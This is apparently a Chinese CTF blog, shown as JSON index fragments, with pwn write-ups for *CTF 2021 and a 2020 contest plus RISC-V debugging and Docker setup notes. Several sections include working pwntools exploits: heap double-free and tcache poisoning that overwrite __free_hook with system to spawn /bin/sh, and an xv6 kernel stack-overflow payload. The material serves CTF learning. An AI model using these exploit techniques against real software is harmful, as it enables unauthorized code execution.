我们需要进一步理解qemu-user，它将模拟的程序加载到自己进程的内存里，然后读取其中的数据模拟执行。但qemu-user实际上却允许模拟程序的代码访问qemu本体进程的内存（32位由于高地址太高访问不到，但64位却可以），这便是突破口。 来详细看看内存布局，有以下几点值得注意 qemu本体被加载到内存中的地址就是0x555555554000 （aslr=False） 被模拟的程序在很低的地址处 libc仍然在高地址处 0x4000001000是固定的，是qemu给risc-v分配的栈空间 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x10000 0x6c000 r--p 5c000 0 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/main 0x6c000 0x6f000 rw-p 3000 5b000 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/main 0x6f000 0x93000 rw-p 24000 0 0x4000000000 0x4000001000 ---p 1000 0 0x4000001000 0x4000801000 rw-p 800000 0 0x561c72350000 0x561c727b9000 r-xp 469000 0 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/qemu-riscv64 0x561c729b8000 0x561c729f4000 r--p 3c000 468000 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/qemu-riscv64 0x561c729f4000 0x561c72a20000 rw-p 2c000 4a4000 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/qemu-riscv64 0x561c72a20000 0x561c72a3d000 rw-p 1d000 0 0x561c7396a000 0x561c73a13000 rw-p a9000 0 [heap] 0x7fa304000000 0x7fa30bfff000 rwxp 7fff000 0 0x7fa30bfff000 0x7fa30c000000 ---p 1000 0 0x7fa30c000000 0x7fa30c021000 rw-p 21000 0 0x7fa30c021000 0x7fa310000000 ---p 3fdf000 0 0x7fa3114ee000 0x7fa31156f000 rw-p 81000 0 0x7fa31156f000 0x7fa311570000 ---p 1000 0 0x7fa311570000 0x7fa311d75000 rw-p 805000 0 0x7fa311d75000 0x7fa311d76000 r--p 1000 0 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d76000 0x7fa311d78000 r-xp 2000 1000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d78000 0x7fa311d79000 r--p 1000 3000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d79000 0x7fa311d7a000 r--p 1000 3000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d7a000 0x7fa311d7b000 rw-p 1000 4000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d7b000 0x7fa311d7d000 r--p 2000 0 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d7d000 0x7fa311d83000 r-xp 6000 2000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d83000 0x7fa311d84000 r--p 1000 8000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d84000 0x7fa311d85000 ---p 1000 9000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d84000 0x7fa311d85000 ---p 1000 9000 /usr/lib/x86_64-linux-gnu/[144/367] .7.1.0 0x7fa311d85000 0x7fa311d86000 r--p 1000 9000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d86000 0x7fa311d87000 rw-p 1000 a000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d87000 0x7fa311d89000 r--p 2000 0 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311d89000 0x7fa311dda000 r-xp 51000 2000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311dda000 0x7fa311df8000 r--p 1e000 53000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311df8000 0x7fa311df9000 r--p 1000 70000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311df9000 0x7fa311dfa000 rw-p 1000 71000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311dfa000 0x7fa311e04000 r--p a000 0 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e04000 0x7fa311e64000 r-xp 60000 a000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e64000 0x7fa311e7b000 r--p 17000 6a000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7b000 0x7fa311e7c000 ---p 1000 81000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7c000 0x7fa311e7d000 r--p 1000 81000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7d000 0x7fa311e7e000 rw-p 1000 82000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7e000 0x7fa311e85000 r--p 7000 0 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311e85000 0x7fa311e96000 r-xp 11000 7000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311e96000 0x7fa311eb4000 r--p 1e000 18000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311eb4000 0x7fa311eb5000 r--p 1000 35000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311eb5000 0x7fa311eb6000 rw-p 1000 36000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0","date":"2021-01-23","objectID":"/2021/01/starctf2021/:4:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babygame 是一个推箱子游戏，每次只能移动一下 (pwn) pwn@ubuntu:~/share/starctf/pwn_babygame$ ./pwn Please input an level from 1-9: 1 Map: ███ █○█ ████□█ █○ □♀███ ███□ □○█ █ ████ █○█ ███ Please input an order: 123 Wrong input, type 'h' for help Please input an order: h Sokoban How to Play: Push all boxs into target place Map: 1)█:wall 2)○:Target 3)□:Box 4)♀:Player 5)●:Box on target Command: 1)h: show this message 2)q: quit the game 3)w: move up 4)s: move down 5)a: move left 6)d: move right 7)b: move back 8)m: leave message k)n: show name 10)l: show message Please input an order: 玩着玩着就崩了…出题人复盘的时候说这题该给源码的，C++我实在是逆不明白… 我们走完一关以后选择level2，q退出以后会触发double free(ubuntu2004)。给的libc是2.27，跑到ubuntu1804继续玩下去，l意外地泄露了libc地址，猜测有什么东西被free后进入unsorted bin 官方wp有点问题…改了一下 ubuntu18.04能打通 from pwn import * import time context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] io = process(\"./pwn\") io.sendlineafter(\"Please input an level from 1-9:\\n\", '1') step = \"wsaadsswdd\" for i in step: io.sendlineafter(\"Please input an order:\\n\", i) io.sendlineafter(\"Please input an level from 1-9:\\n\", '2') io.sendlineafter(\"Please input an order:\\n\", 'q') io.sendlineafter(\"leave your name?\\n\", 'n') io.sendlineafter(\"restart?\\n\", 'y') io.sendlineafter(\"Please input an level from 1-9:\\n\", 'l') io.recvuntil(\"message:\") libc_base = u64(io.recv(6) + '\\x00\\x00') - 0x3ebca0 success(\"libc_base : @\"+hex(libc_base)) def edit(info): io.sendlineafter(\"Please input an level from 1-9:\\n\", 'q') io.sendlineafter(\"leave your name?\\n\", 'y') io.sendlineafter(\"your name:\", info) io.sendlineafter(\"restart?\", 'y') libc = ELF(\"./pwn\").libc freehook = libc.sym['__free_hook'] + libc_base success(\"freehook : @\"+hex(freehook)) payload = p64(freehook) payload = payload.ljust(0x50,'a') edit(payload) edit(payload) system = libc.sym[\"system\"] + libc_base success(\"system : @\"+hex(system)) payload = p64(system) payload = payload.ljust(0x50,'a') edit(payload) edit(payload) io.sendlineafter(\"Please input an level from 1-9\",'1') io.sendafter(\"Please input an order:\",'m\\n') io.sendafter(\"message:\",'/bin/sh\\x00\\n') io.sendafter(\"Please input an order:\",'q\\n') io.sendafter(\"leave your name?\",'n\\n') io.interactive() ","date":"2021-01-23","objectID":"/2021/01/starctf2021/:5:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babyxv6 share：编译好的 fs.img：文件系统镜像 kernel：内核 run.sh：启动脚本 src：源码 找到user的源码，程序执行逻辑如下 void challenge() { int size; char input[0x80]; printf(\"Welcome to babystack 2021!\\n\"); printf(\"How many bytes do you want to send?\\n\"); size = readnum(); if (size \u003e 0x1000) { printf(\"You are greedy!\\n\"); return; } printf(\"show me your input\\n\"); read(0, input, 0x80); baby(input, size); printf(\"It's time to say goodbye.\\n\"); return; } sysproc.中增加了sys_baby系统调用 uint64 sys_baby(void) { int n; uint64 p; char pad[0x100]; if (argint(1, \u0026n) \u003c 0 || argaddr(0, \u0026p) \u003c 0) return -1; return do_overflow(p, n); } uint64 do_overflow(uint64 src, int sz) { char buf[0x20]; return copyin(myproc()-\u003epagetable, buf, src, sz); } copyin调用了memmove，从用户栈传n个字节到dst // Copy from user to kernel. // Copy len bytes to dst from virtual address srcva in a given page table. // Return 0 on success, -1 on error. int copyin(pagetable_t pagetable, char *dst, uint64 srcva, uint64 len) { uint64 n, va0, pa0; while (len \u003e 0) { va0 = PGROUNDDOWN(srcva); pa0 = walkaddr(pagetable, va0); if (pa0 == 0) return -1; n = PGSIZE - (srcva - va0); if (n \u003e len) n = len; memmove(dst, (void *)(pa0 + (srcva - va0)), n); // user stack -\u003e dst[0:n] len -= n; dst += n; srcva = va0 + PGSIZE; } return 0; } 调用链为： baby(input, size) do_overflow(p, n) p = input, n = size memmove(dst, src, n) dst = buf, src = input, n = size 所以baby()是将input的内容传size大小给do_overflow()中的buf[0x20]，由于size可控，所以可以溢出内核态的buf 这里的思路的是利用do_overflow返回时的寄存器a0,a1,a2分别正好是0, (void *)(pa0 + (srcva - va0)), n，如果返回到read函数就能直接往用户栈上读，做riscv用户态的栈溢出 把kernel objdump下来，返回地址在buf+0x28处 00000000800041be \u003cdo_overflow\u003e: 800041be: 7139 addi sp,sp,-64 800041c0: fc06 sd ra,56(sp) # ra = sp+56 800041c2: f822 sd s0,48(sp) 800041c4: 0080 addi s0,sp,64 # s0 -\u003e stack_top 800041c6: fca43423 sd a0,-56(s0) 800041ca: 87ae mv a5,a1 800041cc: fcf42223 sw a5,-60(s0) 800041d0: ffffe097 auipc ra,0xffffe 800041d4: 450080e7 jalr 1104(ra) # 80002620 \u003cmyproc\u003e 800041d8: 87aa mv a5,a0 800041da: 6bbc ld a5,80(a5) 800041dc: fc442683 lw a3,-60(s0) 800041e0: fd040713 addi a4,s0,-48 # a4 = s0-48 = sp+16 800041e4: fc843603 ld a2,-56(s0) 800041e8: 85ba mv a1,a4 # a4 -\u003e buf 800041ea: 853e mv a0,a5 800041ec: ffffe097 auipc ra,0xffffe 800041f0: fd4080e7 jalr -44(ra) # 800021c0 \u003ccopyin\u003e 800041f4: 87aa mv a5,a0 800041f6: 853e mv a0,a5 800041f8: 70e2 ld ra,56(sp) 800041fa: 7442 ld s0,48(sp) 800041fc: 6121 addi sp,sp,64 800041fe: 8082 ret 接下来是内核态的一些函数 在内核里read由consoleread()实现 // console.c consoleinit(void) { initlock(\u0026cons.lock, \"cons\"); uartinit(); // connect read and write system calls // to consoleread and consolewrite. devsw[CONSOLE].read = consoleread; devsw[CONSOLE].write = consolewrite; } usertrap用于响应用户态的syscall、异常等，在最后利用usertrapret()返回到用户态 // // handle an interrupt, exception, or system call from user space. // called from trampoline.S // void usertrap(void) { int which_dev = 0; if((r_sstatus() \u0026 SSTATUS_SPP) != 0) panic(\"usertrap: not from user mode\"); // send interrupts and exceptions to kerneltrap(), // since we're now in the kernel. w_stvec((uint64)kernelvec); struct proc *p = myproc(); // save user program counter. p-\u003etrapframe-\u003eepc = r_sepc(); if(r_scause() == 8){ // system call if(p-\u003ekilled) exit(-1); // sepc points to the ecall instruction, // but we want to return to the next instruction. p-\u003etrapframe-\u003eepc += 4; // an interrupt will change sstatus \u0026c registers, // so don't enable until done with those registers. intr_on(); syscall(); } else if((which_dev = devintr()) != 0){ // ok } else { printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-\u003epid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); p-\u003ekilled = 1; } if(p-\u003ekilled) exit(-1); // give up the CPU if this is a timer interrupt. if(which_dev == 2) yield(); usertrapret(); } 我们先跳到consoleread，再usertrapret回到用户态 payload = 'a'*0x28 + p64(elf.sym['consoleread']+6) payload += 'a'*0x28 + p64(elf.sym['usertrapret']) r.sendlineafter(\"send?\\n\", str(0xc0)) r.sendlineafter(\"input\\n\", payload) 读risc-v的shellcode到用户栈上，返回到用户态再通过栈溢出ret","date":"2021-01-23","objectID":"/2021/01/starctf2021/:6:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"2019年美国国家安全局(NSA)免费向公众开放其逆向工程框架，集成出工具ghidra并在当年3月登陆github。最近碰到一题risc-v架构（*ctf2021 favourite architecture），需要用ghidra反编译辅助分析，以其为例记录动态与静态调试环境搭建。 $ checksec ./main [*] '/mnt/hgfs/linux_share/starctf/favourite_architecture/share/main' Arch: em_riscv-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x10000) RWX: Has RWX segments ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:0:0","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"静态调试 ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:1:0","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"下载与使用ghidra 下载略 快捷键见[3] L 重命名函数 G 跳转到 ctrl+shift+E 查找 …… ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:1:1","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"踩坑记录 反编译(decompiling)窗口显示unknown error，无法反编译除entry以外的函数 见参考资料[1]，需要设置手动gp（全局寄存器） 在entrypoint最后(0x00101ec)能计算出或者直接在entry的反编译窗口看到gp的正确值为0x6f178 ************************************************************* * FUNCTION ************************************************************* undefined entry () assume gp = 0x6f178 undefined a0:1 \u003cRETURN\u003e entry XREF[3]: Entry Point (*) , 00010018 (*) , 00067e94 (*) 000101c0 ef 00 c0 02 jal ra,FUN_000101ec undefined FUN_000101ec() 000101c4 aa 87 c.mv a5,a0 000101c6 17 05 00 00 auipc a0,0x0 000101ca 13 05 a5 23 addi a0=\u003eLAB_00010400 ,a0,0x23a 000101ce 82 65 c.ldsp a1,0x0 =\u003eStack [0x0 ](sp) 000101d0 30 00 c.addi4s a2,sp,0x8 000101d2 13 71 01 ff andi sp,sp,-0x10 000101d6 97 16 00 00 auipc a3,0x1 000101da 93 86 a6 54 addi a3=\u003eLAB_00011720 ,a3,0x54a 000101de 17 17 00 00 auipc a4,0x1 000101e2 13 07 27 5d addi a4=\u003eLAB_000117b0 ,a4,0x5d2 000101e6 0a 88 c.mv a6,sp 000101e8 6f 10 40 0a j FUN_0001128c undefined FUN_0001128c() -- Flow Override: CALL_RETURN (CALL_TERMINATOR) ************************************************************* * FUNCTION ************************************************************* undefined FUN_000101ec () assume gp = 0x6f178 undefined a0:1 \u003cRETURN\u003e FUN_000101ec XREF[3]: entry:000101c0 (c) , 00011762 (c) , 0006cb80 (*) 000101ec 97 f1 05 00 auipc gp,0x5f 000101f0 93 81 c1 f8 addi gp,gp,-0x74 000101f4 82 80 ret 全选以后ctrl-R，将gp改对即可。 ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:1:2","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"动态调试 ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:2:0","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"qemu+gdb调试 先去掉~/.gdbinit的pwndbg等启动命令，使用原生gdb（如果pwn环境安装在py3中，可以使用gef） source ~/pwndbg/gdbinit.py source ~/GdbPlugins/gef/gef.py 调试脚本，gdb连本地23333端口来连 #!/bin/sh gdb-multiarch -q \\ -ex 'set architecture riscv:rv64' \\ -ex 'file main' \\ -ex 'target remote localhost:23333' \\ -ex 'break *0x0010582'\\ -ex continue \\ ; 攻击脚本，用qemu在23333端口开一个程序并进行攻击（这里题目给了qemu，也可以用自己的） io = process([\"./qemu-riscv64\" , \"-g\", \"23333\" ,\"./main\"], aslr=False) 原生gdb比较简陋，并且功能不够强大，暂时只能凑合着用了 重新学一下gdb指令… Breakpoint 1, 0x0000000000010452 in ?? () (gdb) x/10xi 0x10452 =\u003e 0x10452: jal ra,0x204e4 0x10456: mv a3,a0 0x10458: lw a4,-1952(gp) 0x1045c: lw a5,-1948(gp) 0x10460: addw a5,a5,a4 0x10462: sext.w a5,a5 0x10464: slli a5,a5,0x20 0x10466: srli a5,a5,0x20 0x10468: bne a3,a5,0x10570 0x1046c: lw a5,-1952(gp) (gdb) info registers ra 0x1044c 0x1044c sp 0x40007ffff0 0x40007ffff0 gp 0x6f178 0x6f178 tp 0x71700 0x71700 t0 0x0 0 t1 0x1a3f2 107506 t2 0x71f93 466835 fp 0x40008001f0 0x40008001f0 s1 0x117b0 71600 a0 0x40008000c8 274886295752 a1 0x6d523 447779 a2 0x1 1 a3 0x0 0 a4 0x1 1 a5 0x40008000c8 274886295752 a6 0xfffffffffbad208b -72540021 a7 0x3f 63 s2 0x0 0 s3 0x0 0 s4 0x0 0 s5 0x0 0 s6 0x0 0 s7 0x0 0 s8 0x0 0 s9 0x0 0 s10 0x0 0 s11 0x0 0 t3 0x8101010101010100 -9151031864016699136 t4 0x2f 47 t5 0x1 1 t6 0x0 0 pc 0x10452 0x10452 (gdb) gef可以通过gdb-multiarch -p pid号来使用，但是寄存器等却无法正确识别，原因不明 可以看到能正确解析risc-v的指令与寄存器。如果不行也许得先安装一下gcc-riscv64-linux-gnu sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu 具体见参考资料[2] 经过测试，以下常用工具都不支持risc-v… ROP_gadget (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ ROPgadget --binary ./main --only \"ldsp\" [Error] ELF.getArch() - Architecture not supported [Error] ELF.getArch() - Architecture not supported gef/pwndbg/peda/gdbinit均出现以下类似的exception （个人问题，貌似是py3的锅） (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ gdb-multiarch -q ./main GEF for linux ready, type `gef' to start, `gef config' to configure 50 commands loaded for GDB 9.2 using Python engine 3.8 [*] 4 commands could not be loaded, run `gef missing` to know why. Reading symbols from ./main... (No debugging symbols found in ./main) Python Exception \u003cclass '__main__.GefUnsupportedOS'\u003e 'CPU type is currently not supported: riscv:rv64': gef➤ set architecture riscv:rv64 The target architecture is assumed to be riscv:rv64 gef➤ r Starting program: /mnt/hgfs/linux_share/starctf/favourite_architecture/share/main /build/gdb-OxeNvS/gdb-9.2/gdb/i387-tdep.c:592: internal-error: void i387_supply_fxsave(regcache*, int, const void*): Assertion `tdep-\u003est0_regnum \u003e= I386_ST0_REGNUM' failed. A problem internal to GDB has been detected, further debugging may prove unreliable. This is a bug, please report it. For instructions, see: \u003chttp://www.gnu.org/software/gdb/bugs/\u003e. Aborted (core dumped) (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ Input the flag: You are wrong ._. (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ seccomp-tools乱码且报错 $ seccomp-tools dump ./main ./main: 12: ./main: �����\u003e�\"tEa��\"���#0��#\u0026��������7�#������ׇ��7��w�#���������7��w�#������ׇ��7��w�#��bda��9q�\"��#\u003c��#8��#4���7������5�\u003e��1I�7�����1F�5��\u003e���G�����#4��5����?몇��7��#��7���\u003e����骇��7��#��7���\u003e����窇��7��#��7���\u003e���_檇��7��#�5����䪇��7��#��7��\u003e���_㪇��7��#��7��\u003e����᪇��7��#��7��\u003e���ઇ��7��#��7��\u003e���ު���7��#�� �7��\u003e����ܪ���7��#�� �7��\u003e���?۪���7��#�� �7��\u003e����٪���7��#�� �7��#� 5�����ת���7��#�� �7���\u003e���֪���7��#�� �7���\u003e���Ԫ���7��#�� �7�����1F�5��\u003e���-�pBt!a���\"�#4��#0���7���7��#�� �7�����\u003e����Ϊ���7��������7��#��: File name too long ./main: 1: ./main: Syntax error: Unterminated quoted string ./main: 3: ./main: ���7������������ُ#: not found./main: 3: ./main: ���7�������������ُ#: not found ./main: 3: ./main: ���7�������������ُ#: not found ./main: 3: ./main: �����7�����k�������`f�G)�!��������``d�G\u003e��p^t ��\"���.�#\u0026����#$��������������@���W�Տ�\u003e�bda��yq\"�#\u003c��#\u0026��7��������ُ#: not found ./main: 3: ./main: cannot create ��7�: Directory non","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:2:1","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"参考资料 [1] https://github.com/NationalSecurityAgency/ghidra/issues/2466 [2] https://pdos.csail.mit.edu/6.828/2019/tools.html [3] https://www.cnblogs.com/iBinary/p/13852204.html ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:2:2","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"为获取2.27libc下pwn环境，虚拟机过于麻烦，遂启用docker。 ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:0:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"安装docker 执行这个命令后，脚本就会自动的将一切准备工作做好，并且把Docker CE 的Edge版本安装在系统中 sudo apt install curl curl -fsSL get.docker.com -o get-docker.sh sudo sh get-docker.sh --mirror Aliyun ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:1:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"启动docker服务 sudo systemctl enable docker sudo systemctl start docker ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:2:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"建立docker用户组 这一步是必须的，并且必须将当前用户加入docker用户组，否则权限不够。 sudo groupadd docker sudo usermod -aG docker $USER 然后log out注销当前ubuntu用户，再log in，使其生效。 ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:3:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"换源加速 sudo vi /etc/docker/daemon.json 按i进入插入模式后，在其中添加如下代码 { \"registry-mirrors\": [ \"https://registry.docker-cn.com\" ] } 再重新启动服务即可 sudo systemctl daemon-reload sudo systemctl restart docker ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:4:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"将镜像pull到本地 以pwndocker为例，https://github.com/voidzhakul/pwndocker docker pull registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker 检查是否pull到本地，使用docker images命令查看本地镜像 $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE registry.cn-shenzhen.aliyuncs.com/zhakul/docker pwndocker cffec5c49ab5 2 months ago 1.66GB ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:5:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"将本地目录挂载到镜像中 将我们需要在docker中执行的文件挂载，并运行docker docker run -it -v /home/dock/Downloads:/usr/Downloads images /bin/bash 通过-v参数，冒号前为宿主机目录，必须为绝对路径，冒号后为镜像内挂载的路径，images使用上述提到的REPOSITORY:TAG格式。 ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:6:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"退出、进入容器 退出容器 root@c8cb9d4168c7:## exit 查看所有产生的容器 $ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c8cb9d4168c7 registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker \"/bin/bash\" 16 minutes ago Exited (0) 6 minutes ago crazy_kilby f140ab8db11d registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker \"/bin/bash\" 49 minutes ago Exited (0) 46 minutes ago upbeat_davinci b43caf8776df registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker \"/bin/bash\" 59 minutes ago Exited (0) 19 minutes ago frosty_easley 镜像是静态的。而容器是动态的，类似于镜像的一个实例。如果要重新进入某个容器crazy_kilby docker start crazy_kilby 其容器会在后台运行，attach后即可交互 docker attach crazy_kilby ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:7:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"By X1do0@Lilac, wxk@Lilac ","date":"2020-06-25","objectID":"/2020/06/5space2020/:0:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["PWN"],"content":"of 这题给的C文件与服务器上不同，实际上远程的remove功能并没有清除堆存储cookie的位置…(葵佬透视挂实锤了) 所以是tcache入门题了…double free即可 from pwn import * from time import sleep import sys global io context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] filename = \"./of_27\" ip = \"121.36.74.70\" port = 9999 LOCAL = True if len(sys.argv)==1 else False elf = ELF(filename) remote_libc = \"./libc-2.27.so\" if LOCAL: io = process(filename) libc = elf.libc else: context.log_level = 'debug' io = remote(ip, port) libc = ELF(remote_libc) def choice( idx): io.sendlineafter( \"choice: \", str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add( idx): choice( 1) io.sendlineafter( \"Index: \", str(idx)) io.recvuntil( \"!\\n\") def edit( idx, data): choice( 2) io.sendlineafter( \"Index: \", str(idx)) io.sendafter( \"Content: \", data) def show( idx): choice( 3) io.sendlineafter( \"Index: \", str(idx)) io.recvuntil( \"Content: \") def rm( idx): choice( 4) io.sendlineafter( \"Index: \", str(idx)) add( 0) add( 1) rm( 0) rm( 0) show( 0) heap_addr = u64(io.recv( 6) + '\\0\\0') lg(\"heap_addr\", heap_addr) for i in range(6): rm( 0) show( 0) libc_addr = u64(io.recv( 6) + '\\0\\0') libc.address = libc_addr - (0x3afca0 if LOCAL else 0x3ebca0) lg(\"heap_addr\", heap_addr) lg(\"libc_addr\", libc_addr) lg('libc base', libc.address) edit( 0, p64(libc.symbols['__free_hook'])) add( 2) add( 3) edit( 3, p64(libc.symbols['system'])) edit( 2, \"/bin/sh;\\0\") rm( 2) io.interactive() ","date":"2020-06-25","objectID":"/2020/06/5space2020/:1:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["PWN"],"content":"pwnme ARM智障堆题…环境装了一下午，头秃。1kb的库是文本文件，打开后手动软链接才能执行。 不是很懂ARM…找了个调试模板瞎试出来了，大概类似于fastbin attack吧，简单堆溢出 from pwn import * import sys context.binary = \"./a.out\" LOCAL = False if not LOCAL: io = remote(\"121.36.58.215\", 1337) else: io = process([\"qemu-arm\", \"-g\", \"8080\", \"./a.out\"]) elf = ELF(\"./a.out\") libc = ELF(\"./lib/libuClibc-1.0.34.so\") context.log_level = \"debug\" context.terminal = ['tmux', 'splitw', '-h'] global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} def mydebug(p, s=''): def _get_bstr(): global bps b_str =\"\" for break_point in bps: if type(break_point) == int: b_str += \"b *%s\\n\"%(hex(break_point)) elif type(break_point) == str: b_str += \"b %s\\n\"%(break_point) else: pause(p, \"[_get_bstr] unsupported break point type : \"+str(break_point)) return b_str def _get_gds_str(): global gds res = \"\" for name in gds: val = gds[name] if type(name) != str: pause(p, \"[_get_gds_str] unsupported name type : \"+str(type(name))) if type(val) != int: pause(p, \"[_get_gds_str] unsupported val type : \"+str(type(val))) res += \"set $%s=%d\\n\"%(name, gds[name]) return res if not LOCAL: return gdb.attach(p, _get_bstr()+_get_gds_str()+s) gds['chunk_info'] = 0x21068 gds['chunk_cnt'] = 0x2106C gds['heap'] = 0x22010 # add # bps.append(0x10884) # free # bps.append(0x10AA0) # change # bps.append(0x109A4) bps.append(0x106F0) mydebug(io,\"target remote localhost:8080\") def show(): io.sendlineafter('\u003e\u003e\u003e ','1') def add(len,con): io.sendlineafter('\u003e\u003e\u003e ','2') io.sendlineafter(\"Length:\",str(len)) io.sendafter(\"Tag:\",con) def change(idx,len,con): io.sendlineafter('\u003e\u003e\u003e ','3') io.sendlineafter(\"Index:\",str(idx)) io.sendlineafter(\"Length:\",str(len)) io.sendafter(\"Tag:\",con) def remove(idx): io.sendlineafter('\u003e\u003e\u003e ','4') io.sendlineafter(\"Tag:\",str(idx)) add(0x18,'a'*8) add(0x18,'b'*8) add(0x18,'c'*8) add(0x21,'d'*8) remove(1) remove(2) pay1 = 'xxxx'*7 + p32(0x21)+ p32(0x22) + 'xxxx'*6 + p32(0x21) + p32(0x2107d) pay2 = 'xxxx'*7 + p32(0x21)+ p32(0x21072) change(0,0x70,pay2) add(0x18,'g'*8) add(0x18,'h'*8) add(0x18,'i'*8) pay3 = 'a'*0x10 + p32(4) + p32(elf.got['puts']) change(4,len(pay3),pay3) show() io.recvuntil(\"0 : \") puts_addr = u32(io.recv(4)) 